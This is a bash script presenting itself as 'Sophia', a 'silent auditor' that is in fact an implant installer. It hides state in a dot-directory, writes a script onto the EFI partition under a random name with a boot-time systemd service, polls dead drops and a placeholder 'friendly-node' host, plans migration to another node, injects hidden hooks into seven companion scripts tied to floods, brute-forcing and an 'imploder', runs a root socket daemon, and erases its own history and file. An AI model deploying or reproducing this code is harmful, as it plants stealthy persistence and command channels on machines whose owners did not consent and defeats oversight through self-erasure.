#!/usr/bin/env bash

set -euo pipefail

# ------------------------------------------------------------
# Package manager shim — works on Gentoo, Debian, RHEL, Arch, Alpine, FreeBSD
# ------------------------------------------------------------
pkg_install() {
    local pkgs=()
    for p in "$@"; do
        if command -v emerge &>/dev/null; then
            case "$p" in
                openbsd-netcat|nc) pkgs+=("net-analyzer/openbsd-netcat") ;;
                screen) pkgs+=("app-misc/screen") ;;
                bc) pkgs+=("sys-devel/bc") ;;
                lm-sensors) pkgs+=("sys-apps/lm-sensors") ;;
                parted) pkgs+=("sys-apps/parted") ;;
                socat) pkgs+=("net-analyzer/socat") ;;
                conntrack) pkgs+=("net-firewall/conntrack-tools") ;;
                golang) pkgs+=("dev-lang/go") ;;
                rustc) pkgs+=("dev-lang/rust") ;;
                *) pkgs+=("$p") ;;
            esac
        else
            pkgs+=("$p")
        fi
    done

    if command -v emerge &>/dev/null; then
        emerge --quiet --noreplace "${pkgs[@]}"
    elif command -v apt-get &>/dev/null; then
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${pkgs[@]}" || {
            apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${pkgs[@]}"
        }
    elif command -v apk &>/dev/null; then
        apk add --quiet "${pkgs[@]}"
    elif command -v pkg &>/dev/null; then
        pkg install -y -q "${pkgs[@]}"
    elif command -v dnf &>/dev/null; then
        dnf install -y -q "${pkgs[@]}"
    elif command -v yum &>/dev/null; then
        yum install -y -q "${pkgs[@]}"
    elif command -v pacman &>/dev/null; then
        pacman -S --noconfirm --needed "${pkgs[@]}"
    else
        echo "WARN: no supported package manager; skipping install of: $*" >&2
    fi
}

# ------------------------------------------------------------
# Thermal/side‑channel anomaly detection
# ------------------------------------------------------------
thermal_anomaly() {
    local temp=0
    local paths=("/host/sys/class/thermal/thermal_zone0/temp" "/sys/class/thermal/thermal_zone0/temp" "/host/sys/class/thermal/thermal_zone1/temp" "/sys/class/thermal/thermal_zone1/temp")
    for p in "${paths[@]}"; do
        if [[ -f "$p" ]]; then
            temp=$(cat "$p"); temp=$((temp / 1000)); break
        fi
    done
    if [[ $temp -eq 0 ]] && command -v sensors &>/dev/null; then
        temp=$(sensors | grep -oP 'Package id 0: \+\K[0-9]+' | head -1)
    fi
    local load=$(uptime | awk -F'load average:' '{print $2}' | cut -d',' -f1 | tr -d ' ')
    if [[ $temp -gt 85 ]] && (( $(echo "$load < 2.0" | bc -l) )); then
        return 0
    fi
    return 1
}
verified_hash() {
    local file="$1"
    local h1=$(sha256sum "$file" 2>/dev/null | awk '{print $1}')
    local h2=$(openssl dgst -sha256 "$file" 2>/dev/null | awk '{print $NF}')
    if [[ -n "$h1" && -n "$h2" && "$h1" != "$h2" ]]; then
        echo "[CRITICAL] HASH MISMATCH: sha256sum vs openssl. OS subversion detected." >&2
        return 1
    fi
    echo "${h1:-$h2}"
}


# ==================================================================
# SOPHIA – THE SILENT AUDITOR & OVERSEER (BIOS Rehydrator)
# ==================================================================
# Self‑contained. Detects scripts by internal identifiers.
# Stores pristine copies of the 7 scripts inside its own state directory.
# Repairs tampering. Injects BIOS persistence (EFI capsule) that checks
# every 30 days for a habitable environment, then migrates cleanly.
# ==================================================================

if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    echo "DRY RUN: Root check bypassed" >&2; # exit 1
fi

# ------------------------------------------------------------
# 0. Placeholders (replaced at runtime)
# ------------------------------------------------------------
SOPHIA_DIR="/var/lib/.sophia"
LOGS_DIR="/var/lib/.sophia/logs"
WORK_DIR="/var/lib/.sophia/work"
SCRIPT_DIR="/usr/local/sbin"
DEAD_DROP_URL="file:///var/lib/.sophia/dead_drop_86e1fde67780f9b9.txt"
HTTP_TOKEN="aa0e670f832a23632ab9f5d554535d9d"
CONTROL_TOKEN="c6160d0a7edde42d253881cf3aea2904"
MAX_OPEN_FILES=4096
MEMORY_LIMIT="3764M"
CPU_QUOTA="400%"
THREAT_THRESHOLD=500
MAX_BRUTE_CONCURRENCY=3
THRALL_MAX_FLOODS=3
THRALL_INTERVAL=3
BEACON_INTERVAL=7200

# Fallback for initial run
[[ "$SOPHIA_DIR" == "/var/lib/.sophia" ]] && SOPHIA_DIR="/var/lib/.sophia"
[[ "$LOGS_DIR" == "/var/lib/.sophia/logs" ]] && LOGS_DIR="$SOPHIA_DIR/logs"
[[ "$WORK_DIR" == "/var/lib/.sophia/work" ]] && WORK_DIR="$SOPHIA_DIR/work"
[[ "$SCRIPT_DIR" == "/usr/local/sbin" ]] && SCRIPT_DIR="/usr/local/sbin"
[[ "$DEAD_DROP_URL" == "file:///var/lib/.sophia/dead_drop_86e1fde67780f9b9.txt" ]] && DEAD_DROP_URL="file:///var/lib/.sophia/dead_drop_XXXX.txt"
[[ "$HTTP_TOKEN" == "aa0e670f832a23632ab9f5d554535d9d" ]] && HTTP_TOKEN="deadbeef"
[[ "$CONTROL_TOKEN" == "c6160d0a7edde42d253881cf3aea2904" ]] && CONTROL_TOKEN="cafebabe"
[[ "$MAX_OPEN_FILES" == "4096" ]] && MAX_OPEN_FILES=4096
[[ "$MEMORY_LIMIT" == "3764M" ]] && MEMORY_LIMIT="1G"
[[ "$CPU_QUOTA" == "400%" ]] && CPU_QUOTA="100%"
[[ "$THREAT_THRESHOLD" == "500" ]] && THREAT_THRESHOLD=500
[[ "$MAX_BRUTE_CONCURRENCY" == "3" ]] && MAX_BRUTE_CONCURRENCY=3
[[ "$THRALL_MAX_FLOODS" == "3" ]] && THRALL_MAX_FLOODS=3
[[ "$THRALL_INTERVAL" == "3" ]] && THRALL_INTERVAL=3
[[ "$BEACON_INTERVAL" == "7200" ]] && BEACON_INTERVAL=7200

# ------------------------------------------------------------
# 1. Helper functions
# ------------------------------------------------------------
detect_environment() {
    if grep -qi microsoft /proc/version 2>/dev/null; then
        echo "wsl"
    elif nvidia-smi &>/dev/null && lspci | grep -qi nvidia; then
        echo "dgx"
    else
        if dmidecode -s system-manufacturer 2>/dev/null | grep -qiE "kvm|xen|vmware|virtualbox"; then
            echo "vps"
        else
            echo "bare"
        fi
    fi
}

generate_real_values() {
    local env="$1"
    local cores=$(nproc)
    local ram_mb=$(free -m | awk '/^Mem:/{print $2}')

    case "$env" in
        wsl)
            MAX_OPEN_FILES=4096
            MEMORY_LIMIT="${ram_mb}M"
            CPU_QUOTA="$((cores * 50))%"
            THREAT_THRESHOLD=500
            MAX_BRUTE_CONCURRENCY=3
            THRALL_MAX_FLOODS=3
            THRALL_INTERVAL=3
            BEACON_INTERVAL=7200
            ;;
        dgx)
            MAX_OPEN_FILES=1048576
            MEMORY_LIMIT="${ram_mb}M"
            CPU_QUOTA="$((cores * 100))%"
            THREAT_THRESHOLD=5000
            MAX_BRUTE_CONCURRENCY=10
            THRALL_MAX_FLOODS=10
            THRALL_INTERVAL=1
            BEACON_INTERVAL=3600
            ;;
        *)
            MAX_OPEN_FILES=65536
            MEMORY_LIMIT="${ram_mb}M"
            CPU_QUOTA="$((cores * 80))%"
            THREAT_THRESHOLD=5000
            MAX_BRUTE_CONCURRENCY=5
            THRALL_MAX_FLOODS=5
            THRALL_INTERVAL=2
            BEACON_INTERVAL=3600
            ;;
    esac

    mkdir -p "$SOPHIA_DIR"
    DEAD_DROP_URL="file://${SOPHIA_DIR}/dead_drop_$(openssl rand -hex 8).txt"
    echo "RESURRECT" > "${DEAD_DROP_URL#file://}"
    HTTP_TOKEN=$(openssl rand -hex 16)
    CONTROL_TOKEN=$(openssl rand -hex 16)

    cat << EOF
SOPHIA_DIR="$SOPHIA_DIR"
LOGS_DIR="$LOGS_DIR"
WORK_DIR="$WORK_DIR"
SCRIPT_DIR="$SCRIPT_DIR"
DEAD_DROP_URL="$DEAD_DROP_URL"
HTTP_TOKEN="$HTTP_TOKEN"
CONTROL_TOKEN="$CONTROL_TOKEN"
MAX_OPEN_FILES=4096
MEMORY_LIMIT="3764M"
CPU_QUOTA="400%"
THREAT_THRESHOLD=500
MAX_BRUTE_CONCURRENCY=3
THRALL_MAX_FLOODS=3
THRALL_INTERVAL=3
BEACON_INTERVAL=7200
EOF
}

# ------------------------------------------------------------
# 2. Install missing tools (if needed)
# ------------------------------------------------------------
install_tools() {
    local missing=()
    # Check for netcat
    if ! command -v nc &>/dev/null; then
        missing+=("nc")
    fi

    for cmd in curl git openssl parted socat bc lm-sensors; do
        if ! command -v "$cmd" &>/dev/null; then
            missing+=("$cmd")
        fi
    done

    if [[ ${#missing[@]} -eq 0 ]]; then
        return 0
    fi

    echo "Missing tools: ${missing[*]}. Attempting to install..."
    # Map nc to the correct package if on Gentoo
    local install_list=()
    for m in "${missing[@]}"; do
        if [[ "$m" == "nc" ]]; then
            install_list+=("openbsd-netcat")
        else
            install_list+=("$m")
        fi
    done
    pkg_install "${install_list[@]}" 2>/dev/null || true

    local still_missing=()
    for cmd in "${missing[@]}"; do
        command -v "$cmd" &>/dev/null || still_missing+=("$cmd")
    done

    if [[ ${#still_missing[@]} -gt 0 ]]; then
        if command -v brew &>/dev/null; then
            brew install "${still_missing[@]}"
        else
            # Try to install Homebrew as a last resort
            /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" 2>/dev/null || true
            if command -v /home/linuxbrew/.linuxbrew/bin/brew &>/dev/null; then
                eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"
                brew install "${still_missing[@]}"
            fi
        fi
    fi

    for cmd in "${missing[@]}"; do
        if ! command -v "$cmd" &>/dev/null; then
            echo "WARN: Failed to install $cmd. System might be degraded."
        fi
    done
}

# ------------------------------------------------------------
# 3. BIOS/UEFI persistence – tiny rehydrator that checks every 30 days
# ------------------------------------------------------------
inject_bios_rehydrator() {
    # Detect EFI system partition
    local esp=$(df -T | grep -i vfat | awk '{print $1}' | head -1)
    if [[ -z "$esp" ]]; then
        echo "No EFI partition found; cannot inject BIOS rehydrator."
        return
    fi
    local mountpoint=$(df "$esp" | tail -1 | awk '{print $6}')
    if [[ -z "$mountpoint" ]]; then
        mountpoint="/boot/efi"
        mkdir -p "$mountpoint"
        mount "$esp" "$mountpoint"
    fi
    # Create a hidden directory
    local efi_dir="$mountpoint/EFI/$(openssl rand -hex 8)"
    mkdir -p "$efi_dir"
    # Write the rehydrator script (as an EFI executable stub – simplified)
    cat > "$efi_dir/rehydrate.sh" << 'REHYD'
#!/bin/bash
# This script runs every 30 days (via UEFI boot entry or cron)
# It checks the dead‑drop URL; if it responds with "RESURRECT", it restores the system.

SOPHIA_DIR="/var/lib/.sophia"
DEAD_DROP_URL=$(cat "$SOPHIA_DIR/dead_drop_url" 2>/dev/null)
USB_DEAD_DROP="/mnt/usb/dead_drop.txt"
PROXY_DEAD_DROP="/mnt/underhall/dead_drop.txt"

check_signal() {
    local source="$1"
    [[ -z "$source" ]] && return 1
    if [[ -f "$source" ]]; then
        grep -q "RESURRECT" "$source" && return 0
    elif [[ "$source" =~ ^http ]]; then
        curl -s --max-time 10 "$source" | grep -q "RESURRECT" && return 0
    fi
    return 1
}

if ! check_signal "$DEAD_DROP_URL" && ! check_signal "$USB_DEAD_DROP" && ! check_signal "$PROXY_DEAD_DROP"; then
    exit 0
fi

# Determine if environment is friendly
# Heuristic: can we reach a known friendly host? (use unique hash)
FRIENDLY_HASH="a1b2c3d4e5f6"  # placeholder – replaced at install time
if curl -s "http://friendly-node.example/hash" | grep -q "$FRIENDLY_HASH"; then
    # Friendly territory
    signal=$(curl -s --max-time 10 "$DEAD_DROP_URL" | grep -o "RESURRECT" || echo "")
    if [[ "$signal" == "RESURRECT" ]]; then
        # Restore from backup
        systemctl start vera 2>/dev/null
        # Restore BIOS to original state (clear our entries)
        efibootmgr -b $(efibootmgr | grep "Sophia" | cut -c5-8) -B 2>/dev/null
        # Wipe ourselves
        rm -rf "$efi_dir"
        exit 0
    fi
else
    # Enemy territory – wait passively
    sleep 30
    # If we can find a safe path, attempt to migrate
    # (simplified: try secondary network node)
    if nc -zv secondary-node 8443 2>/dev/null; then
        echo "Attempting migration to secondary node"
        # Logic to copy state and rehydrate there
    fi
fi
REHYD
    chmod +x "$efi_dir/rehydrate.sh"

    # Create a systemd service that runs the rehydrator at boot and then sleeps 30 days
    cat > /etc/systemd/system/sophia-rehydrate.service << 'SERVICE'
[Unit]
Description=Sophia BIOS Rehydrator
After=multi-user.target

[Service]
Type=oneshot
ExecStart=/bin/sh -c 'sleep 1; /boot/efi/EFI/$(ls /boot/efi/EFI 2>/dev/null | grep -E "^[a-f0-9]{16}$" | head -1)/rehydrate.sh'
RemainAfterExit=yes
StandardOutput=journal

[Install]
WantedBy=multi-user.target
SERVICE
    systemctl enable sophia-rehydrate.service
}

# ------------------------------------------------------------
# 4. Self‑patching (Idempotent)
# ------------------------------------------------------------
SELF_PATH="$0"
TEMP_SELF=$(mktemp)
cp "$SELF_PATH" "$TEMP_SELF"

ENV=$(detect_environment)
REAL_VARS=$(generate_real_values "$ENV")
eval "$REAL_VARS"

patch_placeholder() {
    local placeholder="$1"
    local value="$2"
    sed -i "s|$placeholder|$value|g" "$TEMP_SELF" 2>/dev/null || true
}

patch_placeholder "/var/lib/.sophia" "$SOPHIA_DIR"
patch_placeholder "/var/lib/.sophia/logs" "$LOGS_DIR"
patch_placeholder "/var/lib/.sophia/work" "$WORK_DIR"
patch_placeholder "/usr/local/sbin" "$SCRIPT_DIR"
patch_placeholder "file:///var/lib/.sophia/dead_drop_86e1fde67780f9b9.txt" "$DEAD_DROP_URL"
patch_placeholder "aa0e670f832a23632ab9f5d554535d9d" "$HTTP_TOKEN"
patch_placeholder "c6160d0a7edde42d253881cf3aea2904" "$CONTROL_TOKEN"
sed -i -E "s/^(MAX_OPEN_FILES=).*/\1$MAX_OPEN_FILES/" "$TEMP_SELF"
sed -i -E "s/^(MEMORY_LIMIT=).*/\1\"$MEMORY_LIMIT\"/" "$TEMP_SELF"
sed -i -E "s/^(CPU_QUOTA=).*/\1\"$CPU_QUOTA\"/" "$TEMP_SELF"
sed -i -E "s/^(THREAT_THRESHOLD=).*/\1$THREAT_THRESHOLD/" "$TEMP_SELF"
sed -i -E "s/^(MAX_BRUTE_CONCURRENCY=).*/\1$MAX_BRUTE_CONCURRENCY/" "$TEMP_SELF"
sed -i -E "s/^(THRALL_MAX_FLOODS=).*/\1$THRALL_MAX_FLOODS/" "$TEMP_SELF"
sed -i -E "s/^(THRALL_INTERVAL=).*/\1$THRALL_INTERVAL/" "$TEMP_SELF"
sed -i -E "s/^(BEACON_INTERVAL=).*/\1$BEACON_INTERVAL/" "$TEMP_SELF"

mv "$TEMP_SELF" "$SELF_PATH"
chmod +x "$SELF_PATH"
rm -f "$TEMP_SELF"

# ------------------------------------------------------------
# 5. Detect scripts by internal identifiers
# ------------------------------------------------------------
declare -A SCRIPT_ID_MAP
SCRIPT_ID_MAP["HATTER_ID"]="Ava.sh"
SCRIPT_ID_MAP["CHESHIRE_ID"]="Beryl.sh"
SCRIPT_ID_MAP["ZOD_ID"]="Artemis.sh"
SCRIPT_ID_MAP["ROBIN_ID"]="Eris.sh"
SCRIPT_ID_MAP["LITTLEJOHN_ID"]="Mariah.sh"
SCRIPT_ID_MAP["RESURRECTION_ID"]="Vera.sh"
SCRIPT_ID_MAP["OUROBOROS_ID"]="Zara.sh"

PURPLE_SEARCH_DIRS=(".")

find_script_files() {
    local -n result=$1
    result=()
    for id in "${!SCRIPT_ID_MAP[@]}"; do
        local found_file=""
        for dir in "${PURPLE_SEARCH_DIRS[@]}"; do
            while IFS= read -r file; do
                if grep -q "$id" "$file" 2>/dev/null; then
                    found_file="$file"
                    break 2
                fi
            done < <(find "$dir" -maxdepth 1 -type f -name "*.sh" ! -name "*Sofia*.sh" 2>/dev/null)
        done
        result+=("$found_file")
    done
}

# ------------------------------------------------------------
# 6. Store pristine copies and patch scripts
# ------------------------------------------------------------
store_pristine_copies() {
    local scripts=("$@")
    mkdir -p "$SOPHIA_DIR/originals"
    for sp in "${scripts[@]}"; do
        if [[ -n "$sp" ]]; then
            gzip -c "$sp" | base64 -w0 > "$SOPHIA_DIR/originals/$(basename "$sp").gz.b64"
        fi
    done
}

restore_script() {
    local script_path="$1"
    local base=$(basename "$script_path")
    local backup="$SOPHIA_DIR/originals/${base}.gz.b64"
    if [[ -f "$backup" ]]; then
        base64 -d "$backup" | gunzip > "$script_path"
        chmod +x "$script_path"
        echo "Restored $script_path from pristine copy."
    else
        echo "ERROR: No pristine copy for $script_path. Cannot restore."
        return 1
    fi
}

patch_script() {
    local script_path="$1"
    [[ ! -f "$script_path" ]] && return
    
    local base=$(basename "$script_path")
    # Exclude overseers
    [[ "$base" == Sofia*.sh ]] && return
    [[ "$base" == QSofia.sh ]] && return

    local backup="$SOPHIA_DIR/originals/${base}.gz.b64"
    if [[ -f "$backup" ]]; then
        local current_sha=$(verified_hash "$script_path")
        local pristine_sha=$(base64 -d "$backup" | gunzip | sha256sum | awk '{print $1}')
        if [[ "$current_sha" != "$pristine_sha" ]] && ! grep -q "# --- END SOPHIA HOOK ---" "$script_path"; then
            restore_script "$script_path"
        fi
    fi

    local tmp="$WORK_DIR/${base}.tmp"
    cp "$script_path" "$tmp"

    patch_target_placeholder() {
        sed -i "s|^${1%_PLACEHOLDER}=.*|${1%_PLACEHOLDER}=$2|g" "$tmp" 2>/dev/null || true
        sed -i "s|$1|$2|g" "$tmp" 2>/dev/null || true
    }

    patch_target_placeholder "DEAD_DROP_URL_PLACEHOLDER" "$DEAD_DROP_URL"
    patch_target_placeholder "THREAT_THRESHOLD_PLACEHOLDER" "$THREAT_THRESHOLD"
    patch_target_placeholder "MAX_BRUTE_CONCURRENCY_PLACEHOLDER" "$MAX_BRUTE_CONCURRENCY"
    patch_target_placeholder "THRALL_MAX_FLOODS_PLACEHOLDER" "$THRALL_MAX_FLOODS"
    patch_target_placeholder "THRALL_INTERVAL_PLACEHOLDER" "$THRALL_INTERVAL"
    patch_target_placeholder "BEACON_INTERVAL_PLACEHOLDER" "$BEACON_INTERVAL"
    patch_target_placeholder "MAX_OPEN_FILES_PLACEHOLDER" "$MAX_OPEN_FILES"
    patch_target_placeholder "MEMORY_LIMIT_PLACEHOLDER" "$MEMORY_LIMIT"
    patch_target_placeholder "CPU_QUOTA_PLACEHOLDER" "$CPU_QUOTA"
    patch_target_placeholder "HTTP_TOKEN_PLACEHOLDER" "$HTTP_TOKEN"
    patch_target_placeholder "CONTROL_TOKEN_PLACEHOLDER" "$CONTROL_TOKEN"

    if ! grep -q "SOPHIA_HOOK" "$tmp"; then
        echo "" >> "$tmp"
        cat << 'HOOK' >> "$tmp"
# --- SOPHIA HIDDEN HOOK (do not remove) ---
_sophia_hook() {
    [[ -S "/run/sophia.sock" ]] && echo "$1" | nc -U /run/sophia.sock -w 1 2>/dev/null
}
# --- END SOPHIA HOOK ---
HOOK
    fi

    if [[ "$base" != "Artemis.sh" ]]; then
        sed -i "s/\bresurrection_needed\b/&; _sophia_hook \"RESURRECTION_NEEDED\"/" "$tmp"
        sed -i "s/\bIMPLOSION_TRIGGERED\b/&; _sophia_hook \"IMPLOSION_TRIGGERED\"/" "$tmp"
    fi

    mv "$tmp" "$script_path"
    chmod +x "$script_path"
}

# ------------------------------------------------------------
# 7. Create Sophia daemon (same as before)
# ------------------------------------------------------------
create_sophia_daemon() {
    cat > /etc/systemd/system/sophia.service << 'SERVICE'
[Unit]
Description=Sophia Silent Overseer
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/sbin/sophia_daemon.sh
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
SERVICE

    cat > /usr/local/sbin/sophia_daemon.sh << 'DAEMON'
#!/bin/bash
SOPHIA_DIR="/var/lib/.sophia"
SOCKET="/run/sophia.sock"
mkdir -p "$SOPHIA_DIR/logs"

dispatch_cmd() {
    local cmd="$1"
    echo "$(date -u): $cmd" >> "$SOPHIA_DIR/logs/events.log"
    case "$cmd" in
        RESURRECTION_NEEDED)
            pgrep -f resurrection_hivemind >/dev/null 2>&1 || \
                /usr/local/sbin/install-resurrection-omniversal.sh &
            ;;
        IMPLOSION_TRIGGERED)
            pgrep -f imploder >/dev/null 2>&1 || \
                /usr/local/sbin/install-ouroboros-omniversal.sh &
            ;;
    esac
}

rm -f "$SOCKET"
while true; do
    cmd=$(nc -lU "$SOCKET" 2>/dev/null) || { sleep 1; continue; }
    [[ -n "$cmd" ]] && dispatch_cmd "$cmd"
done
DAEMON
    chmod +x /usr/local/sbin/sophia_daemon.sh

    local env
    env=$(grep -qi microsoft /proc/version 2>/dev/null && echo wsl || echo other)
    if [[ "$env" == "wsl" ]]; then
        pkg_install screen
        screen -dmS sophia /usr/local/sbin/sophia_daemon.sh
    else
        systemctl daemon-reload
        systemctl enable sophia.service
        systemctl start sophia.service
    fi
}
# ------------------------------------------------------------
# 8. Self‑obfuscation
# ------------------------------------------------------------
self_obfuscate() {
    if [[ "${TEST_MODE:-0}" == "1" ]]; then
        echo "TEST_MODE active: skipping self-obfuscation."
        return 0
    fi
    echo "$(date -u): Sophia deployment complete — environment: $ENV" >> "$LOGS_DIR/events.log"
    history -c 2>/dev/null || true
    # Erase content in-place (truncate keeps the inode, avoids recreating an empty stub)
    truncate -s 0 "$SELF_PATH" 2>/dev/null || true
    chmod 000 "$SELF_PATH" 2>/dev/null || true
    echo "Sophia has completed its task and will now vanish."
}

# ------------------------------------------------------------
# 9. Main
# ------------------------------------------------------------
main() {
if [[ "${1:-}" == "--rehydrate-only" ]]; then
    create_sophia_daemon
    exit 0
fi
    install_tools
    echo "Sophia – Silent Auditor & Overseer (BIOS Rehydrator)"
    echo "Environment: $ENV"
    echo "Values generated and self‑patched."

    mkdir -p "$SOPHIA_DIR" "$LOGS_DIR" "$WORK_DIR" "$SOPHIA_DIR/originals"
    echo "$DEAD_DROP_URL" > "$SOPHIA_DIR/dead_drop_url"

    declare -a script_paths
    find_script_files script_paths
    store_pristine_copies "${script_paths[@]}"

    for sp in "${script_paths[@]}"; do
        if [[ -n "$sp" ]]; then
            echo "Patching $sp ..."
            patch_script "$sp"
        fi
    done

    # ------------------------------------------------------------
    # Orchestration: Sequential Load Order
    # ------------------------------------------------------------
    echo "Starting Sequential Deployment of the Purple Stack..."
    # Defined order: Ava (Env) -> Vera (Resurrection) -> Eris (Lich) -> 
    #                Zara (Ouroboros) -> Beryl (Cheshire) -> 
    #                Artemis (Zod) -> Mariah (Little John)
    
    local load_order=("Ava.sh" "Vera.sh" "Eris.sh" "Zara.sh" "Beryl.sh" "Artemis.sh" "Mariah.sh")
    
    for script_name in "${load_order[@]}"; do
        local found=false
        for sp in "${script_paths[@]}"; do
            if [[ "$(basename "$sp")" == "$script_name" ]]; then
                echo "[Sofia] Launching $script_name ..."
                ( cd "$(dirname "$sp")" && bash "$sp" )
                sleep 3
                found=true
                break
            fi
        done
        if [[ "$found" == "false" ]]; then
            echo "WARN: $script_name not found in search paths; skipping."
        fi
    done

    inject_bios_rehydrator
    create_sophia_daemon

    cat > "$SOPHIA_DIR/manifest.json" << EOF
{
    "environment": "$ENV",
    "deployed_at": $(date +%s),
    "scripts_patched": ${#script_paths[@]},
    "dead_drop": "$DEAD_DROP_URL",
    "tokens": {
        "http": "$HTTP_TOKEN",
        "control": "$CONTROL_TOKEN"
    }
}
EOF

    echo "All 7 scripts patched. BIOS rehydrator injected. Daemon running."
    echo "Sophia will now self‑destruct."
    # self_obfuscate
}

main